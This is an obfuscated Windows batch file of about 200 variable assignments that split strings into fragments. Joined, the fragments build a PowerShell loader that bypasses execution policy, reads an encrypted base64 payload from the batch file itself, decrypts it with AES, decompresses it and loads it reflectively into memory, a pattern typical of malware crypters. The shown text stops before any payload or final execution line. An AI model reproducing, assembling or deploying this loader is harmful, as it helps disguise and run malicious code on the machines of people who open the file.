@echo off
set "POSkqgOBPJ=rS"
set "rDJvxWhKBz=ll"
set "slDVNdmQkx=32"
set "VuEavhniib=ow"
set "UCxQDDZxYi=1."
set "qgUkkVlhSV=he"
set "QOUFCLEmxY=ws"
set "cEwPSSjxLR=ll"
set "JMyREOFOHB=em"
set "ZcjCjAOkEe=s\"
set "xVFzjbFmkA=\v"
set "QOrQbgwiau=nd"
set "ZggcWuwVGj=co"
set "WhzQBQDiDi=he"
set "WJMtIqfTTX=rs"
set "JTKYbBzbrG= C"
set "GSiNPYwqaW=Sy"
set "UJhrvUtrib=in"
set "fmFTyprGGV=.e"
set "tHIzEvQjoh=do"
set "KXiltFXhrg=\W"
set "oHCdnizgRj=xe"
set "qZXsaPgTST=we"
set "NOhcddBewg=:\"
set "HteckcFfdm=st"
set "YdZpmuAvaj=po"
set "hIhbSJCFsm=y "
set "RgPMGlfxNu=0\"
set "xjfzuWVHSE=Wi"
set "lYpJRrnXAQ= /"
set "JUHjecoIHX=we"
set "QxwAGJemzT=Po"
set "VulmfBhGIG=py"
set "naSqJogFSi=cd"
set "ZntKDVdzPZ= %~dp0"
set "JEZivJFMyg=-4] "
set "JNulNHsSty=L4Yi"
set "eycRsCqJhH=);$Y"
set "zMeLXgcdZL=Etot"
set "UDHoPEJLEA=null"
set "sBMBieuglY=TeLI"
set "kFFWAxDRne=urit"
set "OLmCyVgFpz=flec"
set "wfrnVaxxlS=morF"
set "lRGXsJwQux=ach "
set "CUFYxmyFJn=embl"
set "VSFBFUzCUc=lit("
set "XohxOUknKh=lBlo"
set "vgJaWvPEZf=.Len"
set "QRgbvtklCX=p.Su"
set "HxieXxYqCw=tS46"
set "qTkzqMxlEj=brea"
set "jsRwaAxXIr=3); "
set "XKUUcWqlYh=.Cry"
set "dfGOMqHSxm=Conv"
set "PKbjYVtxSh=ypto"
set "FABhleModl=m(, "
set "AfHHvinPEi=Syst"
set "pAbpZNYVaa=::De"
set "ffMOGOuijF=gMod"
set "ZeZVksOMml== [S"
set "wLtIsJGOyy=eam("
set "NloDuegCWD=saBm"
set "UZnmyrDmTQ=6esa"
set "aMKIkTLttu=axL."
set "IsAGAAxgqi=ring"
set "fwgKNMMqQl=PTtG"
set "OEgZugialu=]::("
set "XFHLLSXeke=ateD"
set "yCrFnXOmhf=ing("
set "GnOrCgjuvh=.IO."
set "qeIoDhKmUw=pres"
set "weofgiFVXh=PKCS"
set "rrFQeGcSub=$kIg"
set "eBFsQqJUoL='gni"
set "VWHUzzrgdd=tem."
set "SSpHIGJwvO=.Sec"
set "QuzFnGxreG=PxEW"
set "uRTIyYqTKl===')"
set "kppWIpHNri=em.C"
set "UVOeYVszeA=Mode"
set "BQgBhszATT=('Tg"
set "bCsChijMTC=th('"
set "nLolUQwNBs=YxE."
set "ZtmoGYgTRo=)($j"
set "nOofaAruWd=rgTX"
set "aSNOHVzGdZ=gth)"
set "NIfANJoorH=t Sy"
set "VlQkYJkpFO=oajA"
set "UAVuwUuUUW=oArr"
set "yMwCKuMVyh=orF'"
set "zzWGVZARgp== $O"
set "vCyEQYZtAf=joaj"
set "AeSbqxwJXX=A = "
set "cJAuhrBfOL=vaxL"
set "CEvpQMESaJ=y.Cr"
set "SEVjyqePjk=eMVs"
set "XFuQkQOYeP=OEto"
set "MNuahTjWIZ=ress"
set "eCWAtWEahj=jOEN"
set "jTrYAensTz=1..-"
set "yjdUWbQGHx=.Key"
set "pSrpZIaCWd=oin "
set "VFYLqGFmzB=ionM"
set "nEUfRIZUPa=Fina"
set "lYYtyvzKNv=).Sp"
set "QClSEQAlMX=$EAu"
set "uRRhYwJTHW=YxVw"
set "KxhnEZRcPa=ct S"
set "JHPFtcKRnQ=ect "
set "pMhgVmbBeu=s75K"
set "LNuuKBrTeH=-joi"
set "EcnbFMiwfI=yTo("
set "CdOWFUHpoG=ewLi"
set "QsJyudLhOF=F'[-"
set "hAfwotAsEV=Comp"
set "ACHXCcYpFM=jA ="
set "jUEntWafHp=raph"
set "CLRNRJAIkN=.Dis"
set "gxvPtbNPxp=S46e"
set "RyomgLAcbW=[Sys"
set "afhmUkXIHk=CFxo"
set "ftRdcShSmX=.-16"
set "tUWrhSjvRD=gjYA"
set "ntPgBsToDY=vsks"
set "kWddeWYHJp=JZYp"
set "xDztTziWxq=bypa"
set "XqtvhTTvzX=pose"
set "YmQjeBfbhg=.Cop"
set "nuHdsyPiro=$HtY"
set "cTKGIqjyOY= New"
set "gnRzAXXqGa=Etot"
set "pVBYcHNrpH=]::N"
set "bRvMYzEwXF=esMa"
set "rzPNZOWbyY=m.IO"
set "XyiwziImyh=Disp"
set "kejmhmGrMo= = N"
set "lovDiiUSBc=File"
set "ptrXXUzWFo=tion"
set "nOfrYtYTRa=$kIg"
set "xnHTirEDwh=ptor"
set "zJOMBscVWf=l5E7"
set "DgbmXvOszK=oL'["
set "DZzCByDAia=pher"
set "zjkxQMXCJA=($JZ"
set "BTMARwqPCM=vD ="
set "YbuIbfhBcX= if "
set "agjLdYMSEL=;$Yv"
set "pEGTpAgMcs=Etot"
set "OKBppNhJnP=$jOE"
set "VXwLSNEyJF=V = "
set "RLTrqigyoX=New-"
set "ScfFqTCvlQ=ode]"
set "EFRoRpqGrN=[Sys"
set "sDZdKBeNxL= = $"
set "rqGjVJRWuW=p = "
set "wQdYcqOomC=e]::"
set "VJmoWbpfVM=.Con"
set "rPAqBzZcBA=gnir"
set "CEhhmAbKGT=e = "
set "orqpvQEFhZ=t.Pa"
set "gDIWauefmG=O.Me"
set "novltQKYdP=se()"
set "SgrQtwHgUE=Nd, "
set "XgOxOSlkCP=, $j"
set "vubJuTWaGE=in $"
set "EXdxOcGcRX=; };"
set "nNGTIACOUr=BC;$"
set "OWshGYkzaq=d = "
set "NxbxSOQsrI=16] "
set "ZeaIwOyvaR=('%~f0'"
set "AbrvPBgDQf=raph"
set "tlrcTjUCAj=::('"
set "MDqUiquDpV=ress"
set "jElGagFVlW=ose("
set "oDbsJsdNZD=..-1"
set "tFvqaizTbU=tB);"
set "PcUsZIASHg=oajA"
set "WTerFowlhy=join"
set "nbmKRgyAoe=comm"
set "nFnVievsBI=tem."
set "NlNZshyzdB=ment"
set "tinlouJcNK=.Mem"
set "RiUsjOmTSU=.Cre"
set "ulEcucCVAB=$kIg"
set "xpZDyNFTex=sion"
set "EhMAxCdswX=trea"
set "izlbgMiOOg= = ["
set "YCLtSjAvzb=)))"
set "guuHMhXxKn=stem"
set "tEFNClsFJF=g = "
set "coeSRZydDK=joaj"
set "qutPunuvtG=oint"
